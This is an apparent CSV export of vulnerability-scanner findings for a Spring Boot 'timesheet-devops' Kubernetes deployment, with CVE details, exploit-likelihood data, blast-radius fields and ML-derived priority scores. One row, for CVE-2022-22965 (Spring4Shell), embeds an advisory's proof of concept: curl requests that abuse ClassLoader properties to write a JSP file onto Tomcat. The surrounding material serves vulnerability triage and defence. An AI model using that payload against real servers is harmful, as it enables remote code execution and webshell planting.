id,schema_version,category,version,fixed_version,cve,file,line,repo,commit,title,description,severity,package,cvss_score,fix_version,target,reference,published_date,detected_by,tool,tool_count,confidence_score,confidence_score_version,affected_assets,identity_kind,identity_key,merged_from_tools,merged_from_sources,in_kev,kev_ransomware,kev_due_date,epss_score,epss_percentile,has_exploit,sbom_component,sbom_purl,sbom_version,sbom_cpe,sbom_match_method,image,image_digest,build_commit,build_number,asset_id,asset_resolution_method,asset_resolution_confidence,internet_facing_state,internet_facing_evidence,internet_facing,internet_facing_unknown,internet_facing_false,asset_criticality,asset_env,asset_owner,asset_namespace,asset_tags,pci_scope,gdpr_scope,requires_auth,network_exposed,blast_radius_count,blast_radius_assets,critical_assets_reachable,nearest_critical_asset_hops,blast_radius_evidence,blast_radius_valid,blast_radius_uncertain,in_blast_radius,source_asset,affected_asset_count,crown_jewel_reachable,shortest_attack_path,blast_radius_score,blast_radius_measurable,asset_type,analyst_score,severity_score,cvss_numeric,epss_numeric,time_decay_factor,rule_score,topology_hops_score,ml_risk_score_oof,xgb_score_oof,lgb_score_oof,ml_oof_fold,xgb_score,lgb_score,ml_risk_score,model_uncertainty,graph_boost,risk_score,risk_score_oof,risk_probability_calibrated,calibration_bucket,top_shap_drivers,priority,priority_for_review,is_false_positive,fp_reason
CVE-2016-1000027,finding/v7.1,vulnerability,5.3.9,6.0.0,CVE-2016-1000027,,,,,spring: HttpInvokerServiceExporter readRemoteInvocation method untrusted java deserialization,"Pivotal Spring Framework through 5.3.16 suffers from a potential remote code execution (RCE) issue if used for Java deserialization of untrusted data. Depending on how the library is implemented within a product, this issue may or not occur, and authentication may be required. NOTE: the vendor's position is that untrusted data is not an intended use case. The product's behavior will not be changed because some users rely on deserialization of trusted data.",CRITICAL,org.springframework:spring-web,9.8,6.0.0,Java,"https://access.redhat.com/security/cve/CVE-2016-1000027, https://bugzilla.redhat.com/show_bug.cgi?id=CVE-2016-1000027",2020-01-02T23:15:11.857Z,['Trivy'],Trivy,1,0.4,scanner_consensus_v1,"['Java', 'pom.xml']",cve,CVE-2016-1000027,['Trivy'],,0,Unknown,,0.32257,0.98222,0,spring-web,pkg:maven/org.springframework/spring-web@5.3.39?type=jar,5.3.39,,name_suffix,farahh448/timesheet-devops,sha256:7b0272947968067c8962590fa528cd14c1110e7c62c0023979032d2e3affeae4,,,timesheet-devops,image_digest,1.0,FALSE,"[""no Ingress"", ""no LoadBalancer/NodePort externe confirme"", ""Service/timesheet-devops type=ClusterIP""]",0,0,1,7,prod,platform,default,['internal-service'],0,0,1,0,0,[],[],99,[],True,False,0.0,timesheet-devops,0,0,[],45.5,1,deployment,0.0,90,9.8,0.32257,0.25,24.192,0.01,32.21576875488623,4.016895294189453,60.41464221558301,0,0.00014388085,41.252139097349,20.626141489101503,41.251995216499004,0,22.1,29.0,0.0,VERY_LOW,"[{""feature"": ""time_decay_factor"", ""impact"": -37.859, ""feature_value"": 0.25, ""direction"": ""lowers_risk""}, {""feature"": ""cvss_numeric"", ""impact"": -5.967, ""feature_value"": 9.8, ""direction"": ""lowers_risk""}, {""feature"": ""epss_numeric"", ""impact"": -4.731, ""feature_value"": 0.3226, ""direction"": ""lowers_risk""}, {""feature"": ""severity_score"", ""impact"": 4.287, ""feature_value"": 90.0, ""direction"": ""raises_risk""}, {""feature"": ""confidence_score"", ""impact"": -0.196, ""feature_value"": 0.4, ""direction"": ""lowers_risk""}]",P5_BACKLOG,26.813840054979952,0,
CVE-2022-22965,finding/v7.1,vulnerability,5.3.9,5.2.20,CVE-2022-22965,,,,,Remote Code Execution (RCE),"## Overview
[org.springframework:spring-beans](https://www.baeldung.com/spring-bean) is a package that is the basis for Spring Framework's IoC container. The BeanFactory interface provides an advanced configuration mechanism capable of managing any type of object.

Affected versions of this package are vulnerable to Remote Code Execution (RCE) via manipulation of `ClassLoader` that is achievable with a POST HTTP request. This could allow an attacker to execute a webshell on a victim's application (TomCat), or download arbitrary files from the server (Payara/Glassfish).

**Note:** 
* Current public exploits require victim applications to be built with JRE version 9 (or above) and to be deployed on either Tomcat, Payara, or Glassfish. 

* However, we have confirmed that it is technically possible for additional exploits to work under additional application configurations as well. 

* As such, while we recommend users prioritize first remediating against the configuration described above, for full protection, we also recommend upgrading all vulnerable versions to the fixed `spring-beans` version regardless of the application configuration.

### Update Log 
* **31/03/2022 -** Severity was raised from 8.1 to 9.8
* **08/04/2022 -** Advisory was updated to reflect that Snyk's security research team was able to author a working PoC of this vulnerability against applications that are deployed on Payara (which is based on Glassfish). 


## PoC
```java
1/ docker run -p 8888:8080 --rm --interactive --tty --name vm1 tomcat:9.0
2/ ./mvnw install
3/ docker cp target/handling-form-submission-complete.war vm1:/usr/local/tomcat/webapps
4/ curl -X POST \
  -H ""pre:<%"" \
  -H ""post:;%>"" \
  -F 'class.module.classLoader.resources.context.parent.pipeline.first.pattern=%{pre}iSystem.out.println(123)%{post}i' \
  -F 'class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp' \
  -F 'class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/handling-form-submission-complete' \
  -F 'class.module.classLoader.resources.context.parent.pipeline.first.prefix=rce' \
  -F 'class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=' \
  http://localhost:8888/handling-form-submission-complete/greeting
5/ curl http://localhost:8888/handling-form-submission-complete/rce.jsp
```
## Remediation
Upgrade `org.springframework:spring-beans` to version 5.2.20, 5.3.18 or higher.
## References
- [CyberKendra Post](https://www.cyberkendra.com/2022/03/springshell-rce-0-day-vulnerability.html)
- [GitHub Commit](https://github.com/spring-projects/spring-framework/commit/002546b3e4b8d791ea6acccb81eb3168f51abb15)
- [LunaSec Blog](https://www.lunasec.io/docs/blog/spring-rce-vulnerabilities/)
- [Payara Blogpost](https://blog.payara.fish/payara-and-spring4shell)
- [Payara PoC](https://github.com/CalumHutton/CVE-2022-22965-PoC_Payara)
- [Snyk Blog - Technical Breakdown](https://snyk.io/blog/spring4shell-zero-day-rce-spring-framework-explained/)
- [Snyk PoC](https://github.com/Kirill89/CVE-2022-22965-PoC)
- [Spring Security Announcement](https://spring.io/blog/2022/03/31/spring-framework-rce-early-announcement)
- [Spring Tomcat Mitigation Advice](https://spring.io/blog/2022/04/01/spring-framework-rce-mitigation-alternative)
- [CISA - Known Exploited Vulnerabilities](https://www.cisa.gov/known-exploited-vulnerabilities-catalog)
- [Nuclei Templates](https://github.com/projectdiscovery/nuclei-templates/blob/main/dast/cves/2022/CVE-2022-22965.yaml)
- [PoC in GitHub](https://github.com/wjl110/CVE-2022-22965_Spring_Core_RCE)
",CRITICAL,org.springframework:spring-beans,9.8,5.2.20,tn.esprit.spring.services:timesheet-devops@1.0,,,['Snyk'],Snyk,1,0.6,scanner_consensus_v1,"['tn.esprit.spring.services:timesheet-devops@1.0', 'Java', 'pom.xml']",cve,CVE-2022-22965,['Snyk'],,1,Unknown,2022-04-25,0.99638,0.99948,1,spring-beans,pkg:maven/org.springframework/spring-beans@5.3.39?type=jar,5.3.39,,name_suffix,farahh448/timesheet-devops,sha256:7b0272947968067c8962590fa528cd14c1110e7c62c0023979032d2e3affeae4,,,timesheet-devops,image_digest,1.0,FALSE,"[""no Ingress"", ""no LoadBalancer/NodePort externe confirme"", ""Service/timesheet-devops type=ClusterIP""]",0,0,1,7,prod,platform,default,['internal-service'],0,0,1,0,0,[],[],99,[],True,False,0.0,timesheet-devops,0,0,[],78.9,1,deployment,29.0,90,9.8,0.99638,0.8,100.0,0.01,76.99375255424924,85.0154800415039,68.97202506699458,4,29.002207,64.13216089298018,46.56718384767417,35.12995389298018,0,67.9,86.2,0.722,HIGH,"[{""feature"": ""cvss_numeric"", ""impact"": -13.425, ""feature_value"": 9.8, ""direction"": ""lowers_risk""}, {""feature"": ""epss_numeric"", ""impact"": -13.254, ""feature_value"": 0.9964, ""direction"": ""lowers_risk""}, {""feature"": ""time_decay_factor"", ""impact"": 6.633, ""feature_value"": 0.8, ""direction"": ""raises_risk""}, {""feature"": ""severity_score"", ""impact"": 4.886, ""feature_value"": 90.0, ""direction"": ""raises_risk""}, {""feature"": ""confidence_score"", ""impact"": -0.302, ""feature_value"": 0.6, ""direction"": ""lowers_risk""}]",P1_24H,61.53513210079234,0,
GHSA-36p3-wjmg-h94x,finding/v7.1,vulnerability,5.3.9,5.3.18,,,,,,Remote Code Execution in Spring Framework,Remote Code Execution in Spring Framework,CRITICAL,spring-beans,9.8,5.3.18,spring-beans v5.3.9,https://github.com/advisories/GHSA-36p3-wjmg-h94x,,['Grype'],Grype,1,0.4,scanner_consensus_v1,['spring-beans v5.3.9'],pkg_version,spring-beans@5.3.9::GHSA-36P3-WJMG-H94X,['Grype'],,0,Unknown,,0.0,0.0,0,spring-beans,pkg:maven/org.springframework/spring-beans@5.3.39?type=jar,5.3.39,,name,farahh448/timesheet-devops,sha256:7b0272947968067c8962590fa528cd14c1110e7c62c0023979032d2e3affeae4,,,timesheet-devops,image_digest,1.0,FALSE,"[""no Ingress"", ""no LoadBalancer/NodePort externe confirme"", ""Service/timesheet-devops type=ClusterIP""]",0,0,1,7,prod,platform,default,['internal-service'],0,0,1,0,0,[],[],99,[],True,False,0.0,timesheet-devops,0,0,[],39.0,1,deployment,30.0,90,9.8,0.0,0.8,77.41439999999999,0.01,49.88122751132979,52.50028610229492,47.26216892036466,4,56.499275,47.27675522587585,51.888015216697696,9.222519774124144,0,62.1,60.9,0.722,HIGH,"[{""feature"": ""severity_score"", ""impact"": 9.982, ""feature_value"": 90.0, ""direction"": ""raises_risk""}, {""feature"": ""time_decay_factor"", ""impact"": 5.793, ""feature_value"": 0.8, ""direction"": ""raises_risk""}, {""feature"": ""epss_numeric"", ""impact"": -1.773, ""feature_value"": 0.0, ""direction"": ""lowers_risk""}, {""feature"": ""cvss_numeric"", ""impact"": -1.759, ""feature_value"": 9.8, ""direction"": ""lowers_risk""}, {""feature"": ""confidence_score"", ""impact"": -0.208, ""feature_value"": 0.4, ""direction"": ""lowers_risk""}]",P3_7D,20.17766445207138,0,
GHSA-g5h3-w546-pj7f,finding/v7.1,vulnerability,2.5.4,2.5.15,,,,,,Spring Boot Security Bypass with Wildcard Pattern Matching on Cloud Foundry,Spring Boot Security Bypass with Wildcard Pattern Matching on Cloud Foundry,CRITICAL,spring-boot-actuator-autoconfigure,9.8,2.5.15,spring-boot-actuator-autoconfigure v2.5.4,https://github.com/advisories/GHSA-g5h3-w546-pj7f,,['Grype'],Grype,1,0.4,scanner_consensus_v1,['spring-boot-actuator-autoconfigure v2.5.4'],pkg_version,spring-boot-actuator-autoconfigure@2.5.4::GHSA-G5H3-W546-PJ7F,['Grype'],,0,Unknown,,0.0,0.0,0,spring-boot-actuator-autoconfigure,pkg:maven/org.springframework.boot/spring-boot-actuator-autoconfigure@2.5.4?type=jar,2.5.4,,name_version,farahh448/timesheet-devops,sha256:7b0272947968067c8962590fa528cd14c1110e7c62c0023979032d2e3affeae4,,,timesheet-devops,image_digest,1.0,FALSE,"[""no Ingress"", ""no LoadBalancer/NodePort externe confirme"", ""Service/timesheet-devops type=ClusterIP""]",0,0,1,7,prod,platform,default,['internal-service'],0,0,1,0,0,[],[],99,[],True,False,0.0,timesheet-devops,0,0,[],39.0,1,deployment,70.0,90,9.8,0.0,0.8,77.41439999999999,0.01,50.810331287694495,52.00013732910156,49.62052524628742,2,56.499275,47.27675522587585,51.888015216697696,9.222519774124144,0,62.1,61.5,0.722,HIGH,"[{""feature"": ""severity_score"", ""impact"": 9.982, ""feature_value"": 90.0, ""direction"": ""raises_risk""}, {""feature"": ""time_decay_factor"", ""impact"": 5.793, ""feature_value"": 0.8, ""direction"": ""raises_risk""}, {""feature"": ""epss_numeric"", ""impact"": -1.773, ""feature_value"": 0.0, ""direction"": ""lowers_risk""}, {""feature"": ""cvss_numeric"", ""impact"": -1.759, ""feature_value"": 9.8, ""direction"": ""lowers_risk""}, {""feature"": ""confidence_score"", ""impact"": -0.208, ""feature_value"": 0.4, ""direction"": ""lowers_risk""}]",P3_7D,20.17766445207138,0,
GHSA-7phw-cxx7-q9vq,finding/v7.1,vulnerability,5.3.9,5.3.26,,,,,,Spring Framework is vulnerable to security bypass via mvcRequestMatcher pattern mismatch,Spring Framework is vulnerable to security bypass via mvcRequestMatcher pattern mismatch,CRITICAL,spring-webmvc,9.1,5.3.26,spring-webmvc v5.3.9,https://github.com/advisories/GHSA-7phw-cxx7-q9vq,,['Grype'],Grype,1,0.4,scanner_consensus_v1,['spring-webmvc v5.3.9'],pkg_version,spring-webmvc@5.3.9::GHSA-7PHW-CXX7-Q9VQ,['Grype'],,0,Unknown,,0.0,0.0,0,spring-webmvc,pkg:maven/org.springframework/spring-webmvc@5.3.39?type=jar,5.3.39,,name,farahh448/timesheet-devops,sha256:7b0272947968067c8962590fa528cd14c1110e7c62c0023979032d2e3affeae4,,,timesheet-devops,image_digest,1.0,FALSE,"[""no Ingress"", ""no LoadBalancer/NodePort externe confirme"", ""Service/timesheet-devops type=ClusterIP""]",0,0,1,7,prod,platform,default,['internal-service'],0,0,1,0,0,[],[],99,[],True,False,0.0,timesheet-devops,0,0,[],39.0,1,deployment,67.0,90,9.1,0.0,0.8,77.41439999999999,0.01,58.6372554842748,68.08666229248047,49.18784867606913,0,67.003365,47.27675522587585,57.14005989443207,19.72660977412415,0,65.2,66.1,0.836,VERY_HIGH,"[{""feature"": ""severity_score"", ""impact"": 11.017, ""feature_value"": 90.0, ""direction"": ""raises_risk""}, {""feature"": ""cvss_numeric"", ""impact"": 9.594, ""feature_value"": 9.1, ""direction"": ""raises_risk""}, {""feature"": ""time_decay_factor"", ""impact"": 6.885, ""feature_value"": 0.8, ""direction"": ""raises_risk""}, {""feature"": ""epss_numeric"", ""impact"": -4.04, ""feature_value"": 0.0, ""direction"": ""lowers_risk""}, {""feature"": ""confidence_score"", ""impact"": -0.917, ""feature_value"": 0.4, ""direction"": ""lowers_risk""}]",P3_7D,27.005322855391697,0,
GHSA-4wrc-f8pq-fpqp,finding/v7.1,vulnerability,5.3.9,6.0.0,,,,,,Pivotal Spring Framework contains unsafe Java deserialization methods,Pivotal Spring Framework contains unsafe Java deserialization methods,CRITICAL,spring-web,9.8,6.0.0,spring-web v5.3.9,https://github.com/advisories/GHSA-4wrc-f8pq-fpqp,,['Grype'],Grype,1,0.4,scanner_consensus_v1,['spring-web v5.3.9'],pkg_version,spring-web@5.3.9::GHSA-4WRC-F8PQ-FPQP,['Grype'],,0,Unknown,,0.0,0.0,0,spring-web,pkg:maven/org.springframework/spring-web@5.3.39?type=jar,5.3.39,,name,farahh448/timesheet-devops,sha256:7b0272947968067c8962590fa528cd14c1110e7c62c0023979032d2e3affeae4,,,timesheet-devops,image_digest,1.0,FALSE,"[""no Ingress"", ""no LoadBalancer/NodePort externe confirme"", ""Service/timesheet-devops type=ClusterIP""]",0,0,1,7,prod,platform,default,['internal-service'],0,0,1,0,0,[],[],99,[],True,False,0.0,timesheet-devops,0,0,[],39.0,1,deployment,35.0,90,9.8,0.0,0.8,77.41439999999999,0.01,56.42713242214101,63.66641616821289,49.18784867606913,0,56.499275,47.27675522587585,51.888015216697696,9.222519774124144,0,62.1,64.8,0.722,HIGH,"[{""feature"": ""severity_score"", ""impact"": 9.982, ""feature_value"": 90.0, ""direction"": ""raises_risk""}, {""feature"": ""time_decay_factor"", ""impact"": 5.793, ""feature_value"": 0.8, ""direction"": ""raises_risk""}, {""feature"": ""epss_numeric"", ""impact"": -1.773, ""feature_value"": 0.0, ""direction"": ""lowers_risk""}, {""feature"": ""cvss_numeric"", ""impact"": -1.759, ""feature_value"": 9.8, ""direction"": ""lowers_risk""}, {""feature"": ""confidence_score"", ""impact"": -0.208, ""feature_value"": 0.4, ""direction"": ""lowers_risk""}]",P3_7D,20.17766445207138,0,
CVE-2023-20873,finding/v7.1,vulnerability,2.5.4,2.5.15,CVE-2023-20873,,,,,spring-boot: Security Bypass With Wildcard Pattern Matching on Cloud Foundry,"In Spring Boot versions 3.0.0 - 3.0.5, 2.7.0 - 2.7.10, and older unsupported versions, an application that is deployed to Cloud Foundry could be susceptible to a security bypass. Users of affected versions should apply the following mitigation: 3.0.x users should upgrade to 3.0.6+. 2.7.x users should upgrade to 2.7.11+. Users of older, unsupported versions should upgrade to 3.0.6+ or 2.7.11+.",CRITICAL,org.springframework.boot:spring-boot-actuator-autoconfigure,9.8,2.5.15,tn.esprit.spring.services:timesheet-devops@1.0,"https://access.redhat.com/security/cve/CVE-2023-20873, https://github.com/advisories/GHSA-g5h3-w546-pj7f",2023-04-20T21:15:08.717Z,['Snyk'],Snyk,1,0.6,scanner_consensus_v1,"['tn.esprit.spring.services:timesheet-devops@1.0', 'Java', 'pom.xml']",cve,CVE-2023-20873,['Snyk'],,0,Unknown,,0.01122,0.64356,0,spring-boot-actuator-autoconfigure,pkg:maven/org.springframework.boot/spring-boot-actuator-autoconfigure@2.5.4?type=jar,2.5.4,,name_suffix,farahh448/timesheet-devops,sha256:7b0272947968067c8962590fa528cd14c1110e7c62c0023979032d2e3affeae4,,,timesheet-devops,image_digest,1.0,FALSE,"[""no Ingress"", ""no LoadBalancer/NodePort externe confirme"", ""Service/timesheet-devops type=ClusterIP""]",0,0,1,7,prod,platform,default,['internal-service'],0,0,1,0,0,[],[],99,[],True,False,0.0,timesheet-devops,0,0,[],39.2,1,deployment,0.0,90,9.8,0.01122,0.25,26.207999999999995,0.01,43.7360486073748,24.101869583129883,63.37022763161971,2,-3.6661324e-05,59.86738003800165,29.93367168833884,59.86741669932565,0,28.4,36.7,0.0,VERY_LOW,"[{""feature"": ""time_decay_factor"", ""impact"": -34.924, ""feature_value"": 0.25, ""direction"": ""lowers_risk""}, {""feature"": ""cvss_numeric"", ""impact"": -7.863, ""feature_value"": 9.8, ""direction"": ""lowers_risk""}, {""feature"": ""epss_numeric"", ""impact"": -5.57, ""feature_value"": 0.0112, ""direction"": ""lowers_risk""}, {""feature"": ""severity_score"", ""impact"": 4.08, ""feature_value"": 90.0, ""direction"": ""raises_risk""}, {""feature"": ""confidence_score"", ""impact"": -0.189, ""feature_value"": 0.6, ""direction"": ""lowers_risk""}]",P5_BACKLOG,38.91380985616448,0,
CVE-2023-20860,finding/v7.1,vulnerability,5.3.9,5.3.26,CVE-2023-20860,,,,,Improper Access Control,"## Overview
[org.springframework:spring-webmvc](https://mvnrepository.com/artifact/org.springframework/spring-webmvc) is a package that provides Model-View-Controller (MVC) architecture and ready components that can be used to develop flexible and loosely coupled web applications.

Affected versions of this package are vulnerable to Improper Access Control when using an un-prefixed double wildcard pattern (`""**""`) in the Spring Security configuration with the `mvcRequestMatcher`. This configuration creates a pattern-matching discrepancy between Spring Security and Spring MVC, potentially allowing unauthorized access.

**Note:**
The Spring security team have published information about an existing PoC, but have not shared the PoC itself publicly, therefore we don't currently have the ability to verify it.
## Remediation
Upgrade `org.springframework:spring-webmvc` to version 5.3.26, 6.0.7 or higher.
## References
- [GitHub Commit](https://github.com/spring-projects/spring-framework/commit/202fa5cdb3a3d0cfe6967e85fa167d978244f28a)
- [Spring Blog](https://spring.io/blog/2023/03/20/spring-framework-6-0-7-and-5-3-26-fix-cve-2023-20860-and-cve-2023-20861)
- [Spring Security Advisory](https://spring.io/security/cve-2023-20860)
",CRITICAL,org.springframework:spring-webmvc,9.1,5.3.26,tn.esprit.spring.services:timesheet-devops@1.0,,,['Snyk'],Snyk,1,0.6,scanner_consensus_v1,"['tn.esprit.spring.services:timesheet-devops@1.0', 'Java', 'pom.xml']",cve,CVE-2023-20860,['Snyk'],,0,Unknown,,0.03514,0.88539,0,spring-webmvc,pkg:maven/org.springframework/spring-webmvc@5.3.39?type=jar,5.3.39,,name_suffix,farahh448/timesheet-devops,sha256:7b0272947968067c8962590fa528cd14c1110e7c62c0023979032d2e3affeae4,,,timesheet-devops,image_digest,1.0,FALSE,"[""no Ingress"", ""no LoadBalancer/NodePort externe confirme"", ""Service/timesheet-devops type=ClusterIP""]",0,0,1,7,prod,platform,default,['internal-service'],0,0,1,0,0,[],[],99,[],True,False,0.0,timesheet-devops,0,0,[],39.7,1,deployment,79.0,90,9.1,0.03514,0.8,83.86559999999999,0.01,68.65125783489412,72.51921844482422,64.78329722496404,1,78.99817,64.13216089298018,71.56516491914634,14.86600910701982,0,76.5,74.7,0.95,VERY_HIGH,"[{""feature"": ""severity_score"", ""impact"": 11.939, ""feature_value"": 90.0, ""direction"": ""raises_risk""}, {""feature"": ""cvss_numeric"", ""impact"": 11.428, ""feature_value"": 9.1, ""direction"": ""raises_risk""}, {""feature"": ""time_decay_factor"", ""impact"": 9.814, ""feature_value"": 0.8, ""direction"": ""raises_risk""}, {""feature"": ""confidence_score"", ""impact"": 1.46, ""feature_value"": 0.6, ""direction"": ""raises_risk""}, {""feature"": ""epss_numeric"", ""impact"": -0.108, ""feature_value"": 0.0351, ""direction"": ""lowers_risk""}]",P2_72H,28.90255402925381,0,
SOC-IMAGEPKG-37059ea8ca1f,finding/v7.1,k8s_best_practice,,Ajuster le manifeste Kubernetes,,,,,,Container CPU Requests Equal Limits,Makes sure that all pods have the same CPU requests as limits set. | Skipped because container-cpu-requests-equal-limits is ignored,CRITICAL,Deployment/apps/v1//timesheet-devops-mysql,,Ajuster le manifeste Kubernetes,Deployment/Deployment/apps/v1//timesheet-devops-mysql,https://kube-score.com/,,['kube-score'],kube-score,1,0.4,scanner_consensus_v1,['Deployment/Deployment/apps/v1//timesheet-devops-mysql'],image_pkg,deployment/deployment/apps/v1//timesheet-devops-mysql::deployment/apps/v1//timesheet-devops-mysql::container-cpu-requests-equal-limits,['kube-score'],,0,Unknown,,0.0,0.0,0,,,,,unmatched,,,,,timesheet-devops-mysql,k8s_workload_target,0.7,FALSE,"[""no Ingress"", ""no LoadBalancer/NodePort externe confirme"", ""Service/timesheet-devops-mysql type=ClusterIP""]",0,0,1,8,prod,platform,default,"['internal-service', 'data']",0,0,1,0,0,[],[],99,[],True,False,0.0,timesheet-devops-mysql,0,0,[],41.0,1,deployment,,90,5.0,0.0,0.8,81.5616,0.01,,,,-1,40.506332,28.80290282398244,34.65461761072169,11.703429176017561,0,53.4,,0.133,VERY_LOW,"[{""feature"": ""cvss_numeric"", ""impact"": -14.158, ""feature_value"": 5.0, ""direction"": ""lowers_risk""}, {""feature"": ""severity_score"", ""impact"": 11.498, ""feature_value"": 90.0, ""direction"": ""raises_risk""}, {""feature"": ""time_decay_factor"", ""impact"": 4.447, ""feature_value"": 0.8, ""direction"": ""raises_risk""}, {""feature"": ""epss_numeric"", ""impact"": -4.298, ""feature_value"": 0.0, ""direction"": ""lowers_risk""}, {""feature"": ""confidence_score"", ""impact"": -1.447, ""feature_value"": 0.4, ""direction"": ""lowers_risk""}]",P3_7D,16.248099871225286,0,
SOC-IMAGEPKG-966d4808300a,finding/v7.1,k8s_best_practice,,Ajuster le manifeste Kubernetes,,,,,,Container Ephemeral Storage Request and Limit,Makes sure all pods have ephemeral-storage requests and limits set | Ephemeral Storage limit is not set; Ephemeral Storage request is not set,CRITICAL,Deployment/apps/v1//timesheet-devops,,Ajuster le manifeste Kubernetes,Deployment/Deployment/apps/v1//timesheet-devops,https://kube-score.com/,,['kube-score'],kube-score,1,0.4,scanner_consensus_v1,['Deployment/Deployment/apps/v1//timesheet-devops'],image_pkg,deployment/deployment/apps/v1//timesheet-devops::deployment/apps/v1//timesheet-devops::container-ephemeral-storage-request-and-limit,['kube-score'],,0,Unknown,,0.0,0.0,0,,,,,unmatched,,,,,timesheet-devops,k8s_workload_target,0.85,FALSE,"[""no Ingress"", ""no LoadBalancer/NodePort externe confirme"", ""Service/timesheet-devops type=ClusterIP""]",0,0,1,7,prod,platform,default,['internal-service'],0,0,1,0,0,[],[],99,[],True,False,0.0,timesheet-devops,0,0,[],39.0,1,deployment,,90,5.0,0.0,0.8,77.41439999999999,0.01,,,,-1,40.506332,28.80290282398244,34.65461761072169,11.703429176017561,0,51.8,,0.133,VERY_LOW,"[{""feature"": ""cvss_numeric"", ""impact"": -14.158, ""feature_value"": 5.0, ""direction"": ""lowers_risk""}, {""feature"": ""severity_score"", ""impact"": 11.498, ""feature_value"": 90.0, ""direction"": ""raises_risk""}, {""feature"": ""time_decay_factor"", ""impact"": 4.447, ""feature_value"": 0.8, ""direction"": ""raises_risk""}, {""feature"": ""epss_numeric"", ""impact"": -4.298, ""feature_value"": 0.0, ""direction"": ""lowers_risk""}, {""feature"": ""confidence_score"", ""impact"": -1.447, ""feature_value"": 0.4, ""direction"": ""lowers_risk""}]",P3_7D,16.248099871225286,0,
